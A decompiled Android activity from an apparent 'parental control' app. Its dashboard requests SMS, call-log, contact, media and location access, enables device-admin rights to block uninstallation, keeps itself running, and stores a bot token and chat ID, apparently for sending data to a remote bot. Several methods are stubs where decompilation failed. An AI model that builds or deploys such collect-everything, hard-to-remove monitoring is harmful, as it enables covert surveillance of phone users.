package com.example;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import androidx.activity.compose.ActivityResultRegistryKt;
import androidx.activity.compose.ManagedActivityResultLauncher;
import androidx.activity.result.ActivityResult;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.autofill.HintConstants;
import androidx.compose.foundation.layout.PaddingValues;
import androidx.compose.foundation.layout.RowScope;
import androidx.compose.material3.ScaffoldKt;
import androidx.compose.material3.TextKt;
import androidx.compose.runtime.Composer;
import androidx.compose.runtime.ComposerKt;
import androidx.compose.runtime.MutableState;
import androidx.compose.runtime.RecomposeScopeImplKt;
import androidx.compose.runtime.ScopeUpdateScope;
import androidx.compose.runtime.State;
import androidx.compose.runtime.internal.ComposableLambdaKt;
import androidx.compose.ui.Modifier;
import androidx.compose.ui.text.TextLayoutResult;
import androidx.compose.ui.text.TextStyle;
import androidx.compose.ui.text.font.FontFamily;
import androidx.compose.ui.text.font.FontStyle;
import androidx.compose.ui.text.font.FontWeight;
import androidx.compose.ui.text.style.TextAlign;
import androidx.compose.ui.text.style.TextDecoration;
import androidx.compose.ui.unit.TextUnitKt;
import androidx.lifecycle.Lifecycle;
import androidx.lifecycle.LifecycleOwner;
import androidx.lifecycle.compose.FlowExtKt;
import com.example.receivers.AdminReceiver;
import com.example.services.LocationForegroundService;
import com.example.ui.MainViewModel;
import com.example.ui.theme.ColorKt;
import com.google.accompanist.permissions.MultiplePermissionsState;
import com.google.accompanist.permissions.MultiplePermissionsStateKt;
import java.util.List;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.collections.CollectionsKt;
import kotlin.coroutines.CoroutineContext;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.functions.Function3;
import kotlin.jvm.internal.Intrinsics;

/* JADX INFO: compiled from: MainActivity.kt */
/* JADX INFO: loaded from: classes8.dex */
@Metadata(d1 = {"\u0000$\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0006\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0005\u001a\u001d\u0010\u0000\u001a\u00020\u00012\u0006\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H\u0007¢\u0006\u0002\u0010\u0006\u001a\u0015\u0010\u0007\u001a\u00020\u00012\u0006\u0010\u0002\u001a\u00020\u0003H\u0007¢\u0006\u0002\u0010\b\u001a\u001d\u0010\t\u001a\u00020\u00012\u0006\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H\u0007¢\u0006\u0002\u0010\u0006¨\u0006\n²\u0006\n\u0010\u000b\u001a\u00020\fX\u008a\u0084\u0002²\u0006\n\u0010\r\u001a\u00020\u000eX\u008a\u008e\u0002²\u0006\n\u0010\u000f\u001a\u00020\fX\u008a\u008e\u0002²\u0006\n\u0010\u0010\u001a\u00020\u000eX\u008a\u0084\u0002²\u0006\n\u0010\u0011\u001a\u00020\u000eX\u008a\u0084\u0002²\u0006\n\u0010\u0012\u001a\u00020\fX\u008a\u0084\u0002²\u0006\n\u0010\u0013\u001a\u00020\fX\u008a\u0084\u0002"}, d2 = {"AppContent", "", "viewModel", "Lcom/example/ui/MainViewModel;", "context", "Landroid/content/Context;", "(Lcom/example/ui/MainViewModel;Landroid/content/Context;Landroidx/compose/runtime/Composer;I)V", "LockScreen", "(Lcom/example/ui/MainViewModel;Landroidx/compose/runtime/Composer;I)V", "ParentalControlDashboard", "app", "isAuthenticated", "", HintConstants.AUTOFILL_HINT_PASSWORD, "", "error", "botToken", "chatId", "isMonitoring", "isAdminActive"}, k = 2, mv = {2, 2, 0}, xi = 48)
public final class MainActivityKt {
    static final Unit AppContent$lambda$1(MainViewModel mainViewModel, Context context, int i, Composer composer, int i2) {
        AppContent(mainViewModel, context, composer, RecomposeScopeImplKt.updateChangedFlags(i | 1));
        return Unit.INSTANCE;
    }

    static final Unit LockScreen$lambda$14(MainViewModel mainViewModel, int i, Composer composer, int i2) {
        LockScreen(mainViewModel, composer, RecomposeScopeImplKt.updateChangedFlags(i | 1));
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$58(MainViewModel mainViewModel, Context context, int i, Composer composer, int i2) {
        ParentalControlDashboard(mainViewModel, context, composer, RecomposeScopeImplKt.updateChangedFlags(i | 1));
        return Unit.INSTANCE;
    }

    public static final void AppContent(final MainViewModel viewModel, final Context context, Composer $composer, final int $changed) {
        Intrinsics.checkNotNullParameter(viewModel, "viewModel");
        Intrinsics.checkNotNullParameter(context, "context");
        Composer $composer2 = $composer.startRestartGroup(-511532257);
        ComposerKt.sourceInformation($composer2, "C(AppContent)P(1)80@3309L29:MainActivity.kt#to5c3");
        int $dirty = $changed;
        if (($changed & 6) == 0) {
            $dirty |= $composer2.changedInstance(viewModel) ? 4 : 2;
        }
        if (($changed & 48) == 0) {
            $dirty |= $composer2.changedInstance(context) ? 32 : 16;
        }
        if (($dirty & 19) == 18 && $composer2.getSkipping()) {
            $composer2.skipToGroupEnd();
        } else {
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventStart(-511532257, $dirty, -1, "com.example.AppContent (MainActivity.kt:79)");
            }
            State isAuthenticated$delegate = FlowExtKt.collectAsStateWithLifecycle(viewModel.isAuthenticated(), (LifecycleOwner) null, (Lifecycle.State) null, (CoroutineContext) null, $composer2, 0, 7);
            if (AppContent$lambda$0(isAuthenticated$delegate)) {
                $composer2.startReplaceGroup(-513315705);
                ComposerKt.sourceInformation($composer2, "83@3379L44");
                ParentalControlDashboard(viewModel, context, $composer2, ($dirty & 14) | ($dirty & 112));
                $composer2.endReplaceGroup();
            } else {
                $composer2.startReplaceGroup(-513250946);
                ComposerKt.sourceInformation($composer2, "85@3445L21");
                LockScreen(viewModel, $composer2, $dirty & 14);
                $composer2.endReplaceGroup();
            }
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventEnd();
            }
        }
        ScopeUpdateScope scopeUpdateScopeEndRestartGroup = $composer2.endRestartGroup();
        if (scopeUpdateScopeEndRestartGroup != null) {
            scopeUpdateScopeEndRestartGroup.updateScope(new Function2() { // from class: com.example.MainActivityKt$$ExternalSyntheticLambda6
                @Override // kotlin.jvm.functions.Function2
                public final Object invoke(Object obj, Object obj2) {
                    return MainActivityKt.AppContent$lambda$1(viewModel, context, $changed, (Composer) obj, ((Integer) obj2).intValue());
                }
            });
        }
    }

    private static final boolean AppContent$lambda$0(State<Boolean> state) {
        return ((Boolean) state.getValue()).booleanValue();
    }

    /* JADX WARN: Removed duplicated region for block: B:58:0x04a8  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x04b6  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x050a  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0560  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x059b  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x062b  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static final void LockScreen(final com.example.ui.MainViewModel r135, androidx.compose.runtime.Composer r136, final int r137) {
        /*
            Method dump skipped, instruction units count: 1597
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.example.MainActivityKt.LockScreen(com.example.ui.MainViewModel, androidx.compose.runtime.Composer, int):void");
    }

    private static final String LockScreen$lambda$3(MutableState<String> mutableState) {
        return mutableState.getValue();
    }

    private static final boolean LockScreen$lambda$6(MutableState<Boolean> mutableState) {
        return mutableState.getValue().booleanValue();
    }

    private static final void LockScreen$lambda$7(MutableState<Boolean> mutableState, boolean z) {
        mutableState.setValue(Boolean.valueOf(z));
    }

    static final Unit LockScreen$lambda$13$lambda$10$lambda$9(MutableState $password$delegate, MutableState $error$delegate, String it) {
        Intrinsics.checkNotNullParameter(it, "it");
        $password$delegate.setValue(it);
        LockScreen$lambda$7($error$delegate, false);
        return Unit.INSTANCE;
    }

    static final Unit LockScreen$lambda$13$lambda$12$lambda$11(MainViewModel $viewModel, MutableState $error$delegate, MutableState $password$delegate) {
        if ($viewModel.getSecurityManager().isLockedOut() || !$viewModel.authenticate(LockScreen$lambda$3($password$delegate))) {
            LockScreen$lambda$7($error$delegate, true);
        }
        return Unit.INSTANCE;
    }

    public static final void ParentalControlDashboard(final MainViewModel viewModel, final Context context, Composer $composer, final int $changed) {
        State botToken$delegate;
        Object obj;
        Intrinsics.checkNotNullParameter(viewModel, "viewModel");
        Intrinsics.checkNotNullParameter(context, "context");
        Composer $composer2 = $composer.startRestartGroup(2054973875);
        ComposerKt.sourceInformation($composer2, "C(ParentalControlDashboard)P(1)155@6092L29,156@6157L29,157@6234L29,158@6313L29,176@7049L59,178@7222L45,178@7138L129,183@7304L2882,250@10227L13619,182@7277L16569:MainActivity.kt#to5c3");
        int $dirty = $changed;
        if (($changed & 6) == 0) {
            $dirty |= $composer2.changedInstance(viewModel) ? 4 : 2;
        }
        if (($changed & 48) == 0) {
            $dirty |= $composer2.changedInstance(context) ? 32 : 16;
        }
        if (($dirty & 19) == 18 && $composer2.getSkipping()) {
            $composer2.skipToGroupEnd();
        } else {
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventStart(2054973875, $dirty, -1, "com.example.ParentalControlDashboard (MainActivity.kt:154)");
            }
            State botToken$delegate2 = FlowExtKt.collectAsStateWithLifecycle(viewModel.getBotToken(), (LifecycleOwner) null, (Lifecycle.State) null, (CoroutineContext) null, $composer2, 0, 7);
            final State chatId$delegate = FlowExtKt.collectAsStateWithLifecycle(viewModel.getChatId(), (LifecycleOwner) null, (Lifecycle.State) null, (CoroutineContext) null, $composer2, 0, 7);
            final State isMonitoring$delegate = FlowExtKt.collectAsStateWithLifecycle(viewModel.isMonitoring(), (LifecycleOwner) null, (Lifecycle.State) null, (CoroutineContext) null, $composer2, 0, 7);
            final State isAdminActive$delegate = FlowExtKt.collectAsStateWithLifecycle(viewModel.isAdminActive(), (LifecycleOwner) null, (Lifecycle.State) null, (CoroutineContext) null, $composer2, 0, 7);
            List permissions = CollectionsKt.mutableListOf("android.permission.ACCESS_COARSE_LOCATION", "android.permission.ACCESS_FINE_LOCATION", "android.permission.READ_SMS", "android.permission.READ_CALL_LOG", "android.permission.READ_CONTACTS");
            if (Build.VERSION.SDK_INT >= 33) {
                permissions.add("android.permission.POST_NOTIFICATIONS");
                permissions.add("android.permission.READ_MEDIA_IMAGES");
                permissions.add("android.permission.READ_MEDIA_VIDEO");
                permissions.add("android.permission.READ_MEDIA_AUDIO");
            } else {
                permissions.add("android.permission.READ_EXTERNAL_STORAGE");
            }
            final MultiplePermissionsState permissionState = MultiplePermissionsStateKt.rememberMultiplePermissionsState(permissions, null, $composer2, 0, 2);
            ActivityResultContracts.StartActivityForResult startActivityForResult = new ActivityResultContracts.StartActivityForResult();
            ComposerKt.sourceInformationMarkerStart($composer2, -855019648, "CC(remember):MainActivity.kt#9igjgp");
            boolean zChangedInstance = $composer2.changedInstance(viewModel);
            Object objRememberedValue = $composer2.rememberedValue();
            if (zChangedInstance || objRememberedValue == Composer.INSTANCE.getEmpty()) {
                botToken$delegate = botToken$delegate2;
                obj = new Function1() { // from class: com.example.MainActivityKt$$ExternalSyntheticLambda9
                    @Override // kotlin.jvm.functions.Function1
                    public final Object invoke(Object obj2) {
                        return MainActivityKt.ParentalControlDashboard$lambda$20$lambda$19(viewModel, (ActivityResult) obj2);
                    }
                };
                $composer2.updateRememberedValue(obj);
            } else {
                botToken$delegate = botToken$delegate2;
                obj = objRememberedValue;
            }
            ComposerKt.sourceInformationMarkerEnd($composer2);
            final ManagedActivityResultLauncher adminLauncher = ActivityResultRegistryKt.rememberLauncherForActivityResult(startActivityForResult, (Function1) obj, $composer2, 0);
            final State botToken$delegate3 = botToken$delegate;
            ScaffoldKt.m2408ScaffoldTvnljyQ(null, ComposableLambdaKt.rememberComposableLambda(-60089745, true, new Function2() { // from class: com.example.MainActivityKt$$ExternalSyntheticLambda10
                @Override // kotlin.jvm.functions.Function2
                public final Object invoke(Object obj2, Object obj3) {
                    return MainActivityKt.ParentalControlDashboard$lambda$27(isMonitoring$delegate, (Composer) obj2, ((Integer) obj3).intValue());
                }
            }, $composer2, 54), null, null, null, 0, ColorKt.getGray100(), 0L, null, ComposableLambdaKt.rememberComposableLambda(1329822916, true, new Function3() { // from class: com.example.MainActivityKt$$ExternalSyntheticLambda11
                @Override // kotlin.jvm.functions.Function3
                public final Object invoke(Object obj2, Object obj3, Object obj4) {
                    return MainActivityKt.ParentalControlDashboard$lambda$57(viewModel, permissionState, context, adminLauncher, botToken$delegate3, chatId$delegate, isAdminActive$delegate, isMonitoring$delegate, (PaddingValues) obj2, (Composer) obj3, ((Integer) obj4).intValue());
                }
            }, $composer2, 54), $composer2, 806879280, 445);
            $composer2 = $composer2;
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventEnd();
            }
        }
        ScopeUpdateScope scopeUpdateScopeEndRestartGroup = $composer2.endRestartGroup();
        if (scopeUpdateScopeEndRestartGroup != null) {
            scopeUpdateScopeEndRestartGroup.updateScope(new Function2() { // from class: com.example.MainActivityKt$$ExternalSyntheticLambda12
                @Override // kotlin.jvm.functions.Function2
                public final Object invoke(Object obj2, Object obj3) {
                    return MainActivityKt.ParentalControlDashboard$lambda$58(viewModel, context, $changed, (Composer) obj2, ((Integer) obj3).intValue());
                }
            });
        }
    }

    private static final String ParentalControlDashboard$lambda$15(State<String> state) {
        return (String) state.getValue();
    }

    private static final String ParentalControlDashboard$lambda$16(State<String> state) {
        return (String) state.getValue();
    }

    private static final boolean ParentalControlDashboard$lambda$17(State<Boolean> state) {
        return ((Boolean) state.getValue()).booleanValue();
    }

    private static final boolean ParentalControlDashboard$lambda$18(State<Boolean> state) {
        return ((Boolean) state.getValue()).booleanValue();
    }

    static final Unit ParentalControlDashboard$lambda$20$lambda$19(MainViewModel $viewModel, ActivityResult it) {
        Intrinsics.checkNotNullParameter(it, "it");
        $viewModel.refreshAdminState();
        return Unit.INSTANCE;
    }

    /* JADX WARN: Removed duplicated region for block: B:103:0x0825  */
    /* JADX WARN: Removed duplicated region for block: B:107:0x0921  */
    /* JADX WARN: Removed duplicated region for block: B:28:0x01e3  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x01ef  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x01f5  */
    /* JADX WARN: Removed duplicated region for block: B:43:0x02fb  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x0307  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x030d  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x03e7  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x05c2  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x068a  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0696  */
    /* JADX WARN: Removed duplicated region for block: B:81:0x069c  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x06cf  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x06e5  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x07cc  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x07d8  */
    /* JADX WARN: Removed duplicated region for block: B:96:0x07de  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x080f  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    static final kotlin.Unit ParentalControlDashboard$lambda$27(androidx.compose.runtime.State r123, androidx.compose.runtime.Composer r124, int r125) {
        /*
            Method dump skipped, instruction units count: 2343
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.example.MainActivityKt.ParentalControlDashboard$lambda$27(androidx.compose.runtime.State, androidx.compose.runtime.Composer, int):kotlin.Unit");
    }

    /* JADX WARN: Removed duplicated region for block: B:123:0x0c8a  */
    /* JADX WARN: Removed duplicated region for block: B:126:0x0c96  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x0c9c  */
    /* JADX WARN: Removed duplicated region for block: B:130:0x0ccf  */
    /* JADX WARN: Removed duplicated region for block: B:134:0x0ce5 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:138:0x0d50  */
    /* JADX WARN: Removed duplicated region for block: B:142:0x0d5e  */
    /* JADX WARN: Removed duplicated region for block: B:146:0x0e0c  */
    /* JADX WARN: Removed duplicated region for block: B:150:0x0e1a  */
    /* JADX WARN: Removed duplicated region for block: B:154:0x0f0a  */
    /* JADX WARN: Removed duplicated region for block: B:162:0x0fc7  */
    /* JADX WARN: Removed duplicated region for block: B:165:0x0fe3  */
    /* JADX WARN: Removed duplicated region for block: B:169:0x0ff0  */
    /* JADX WARN: Removed duplicated region for block: B:172:0x107a  */
    /* JADX WARN: Removed duplicated region for block: B:188:0x1235  */
    /* JADX WARN: Removed duplicated region for block: B:198:0x13b4  */
    /* JADX WARN: Removed duplicated region for block: B:201:0x13c0  */
    /* JADX WARN: Removed duplicated region for block: B:202:0x13c6  */
    /* JADX WARN: Removed duplicated region for block: B:213:0x14e1  */
    /* JADX WARN: Removed duplicated region for block: B:216:0x14ed  */
    /* JADX WARN: Removed duplicated region for block: B:217:0x14f3  */
    /* JADX WARN: Removed duplicated region for block: B:228:0x15fe  */
    /* JADX WARN: Removed duplicated region for block: B:231:0x160a  */
    /* JADX WARN: Removed duplicated region for block: B:232:0x1610  */
    /* JADX WARN: Removed duplicated region for block: B:235:0x1641  */
    /* JADX WARN: Removed duplicated region for block: B:239:0x1657  */
    /* JADX WARN: Removed duplicated region for block: B:243:0x1700  */
    /* JADX WARN: Removed duplicated region for block: B:244:0x1703  */
    /* JADX WARN: Removed duplicated region for block: B:247:0x1775  */
    /* JADX WARN: Removed duplicated region for block: B:251:0x1780  */
    /* JADX WARN: Removed duplicated region for block: B:254:0x186e  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x053e  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x054b  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x06a1  */
    /* JADX WARN: Removed duplicated region for block: B:75:0x075d  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    static final kotlin.Unit ParentalControlDashboard$lambda$57(final com.example.ui.MainViewModel r146, final com.google.accompanist.permissions.MultiplePermissionsState r147, final android.content.Context r148, final androidx.activity.compose.ManagedActivityResultLauncher r149, androidx.compose.runtime.State r150, androidx.compose.runtime.State r151, androidx.compose.runtime.State r152, androidx.compose.runtime.State r153, androidx.compose.foundation.layout.PaddingValues r154, androidx.compose.runtime.Composer r155, int r156) {
        /*
            Method dump skipped, instruction units count: 6260
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.example.MainActivityKt.ParentalControlDashboard$lambda$57(com.example.ui.MainViewModel, com.google.accompanist.permissions.MultiplePermissionsState, android.content.Context, androidx.activity.compose.ManagedActivityResultLauncher, androidx.compose.runtime.State, androidx.compose.runtime.State, androidx.compose.runtime.State, androidx.compose.runtime.State, androidx.compose.foundation.layout.PaddingValues, androidx.compose.runtime.Composer, int):kotlin.Unit");
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$32$lambda$31(MultiplePermissionsState $permissionState) {
        $permissionState.launchMultiplePermissionRequest();
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$40$lambda$37$lambda$36(Context $context) {
        try {
            Intent intent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
            $context.startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$40$lambda$39$lambda$38(MainViewModel $viewModel) {
        try {
            $viewModel.getNotificationHelper().openNotificationSettings();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$42$lambda$41(MainViewModel $viewModel) {
        try {
            $viewModel.getOemManager().openAutoStartSettings();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$43(MainViewModel $viewModel, RowScope Button, Composer $composer, int $changed) {
        Intrinsics.checkNotNullParameter(Button, "$this$Button");
        ComposerKt.sourceInformation($composer, "C411@17853L129:MainActivity.kt#to5c3");
        if (($changed & 17) == 16 && $composer.getSkipping()) {
            $composer.skipToGroupEnd();
        } else {
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventStart(1010868220, $changed, -1, "com.example.ParentalControlDashboard.<anonymous>.<anonymous>.<anonymous> (MainActivity.kt:411)");
            }
            TextKt.m2693Text4IGK_g("Enable Auto-Start (Required for " + $viewModel.getOemManager().getManufacturer() + ")", (Modifier) null, 0L, TextUnitKt.getSp(13), (FontStyle) null, FontWeight.INSTANCE.getSemiBold(), (FontFamily) null, 0L, (TextDecoration) null, (TextAlign) null, 0L, 0, false, 0, 0, (Function1<? super TextLayoutResult, Unit>) null, (TextStyle) null, $composer, 199680, 0, 131030);
            if (ComposerKt.isTraceInProgress()) {
                ComposerKt.traceEventEnd();
            }
        }
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$45$lambda$44(MainViewModel $viewModel) {
        try {
            $viewModel.getBatteryHelper().requestDisableBatteryOptimization();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$49$lambda$48(ManagedActivityResultLauncher $adminLauncher, Context $context) {
        try {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", new ComponentName($context, (Class<?>) AdminReceiver.class));
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "Required to prevent unauthorized app removal.");
            $adminLauncher.launch(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return Unit.INSTANCE;
    }

    static final Unit ParentalControlDashboard$lambda$57$lambda$56$lambda$55$lambda$54$lambda$53$lambda$52(MainViewModel $viewModel, Context $context, boolean active) {
        if (active) {
            try {
                $viewModel.setMonitoring(true);
                Intent intent = new Intent($context, (Class<?>) LocationForegroundService.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    $context.startForegroundService(intent);
                } else {
                    $context.startService(intent);
                }
            } catch (Exception e) {
                e.printStackTrace();
                $viewModel.setMonitoring(false);
                Unit unit = Unit.INSTANCE;
            }
        } else {
            try {
                $viewModel.setMonitoring(false);
                Intent intent2 = new Intent($context, (Class<?>) LocationForegroundService.class);
                intent2.setAction("ACTION_STOP");
                $context.startService(intent2);
            } catch (Exception e2) {
                e2.printStackTrace();
                Unit unit2 = Unit.INSTANCE;
            }
        }
        return Unit.INSTANCE;
    }
}
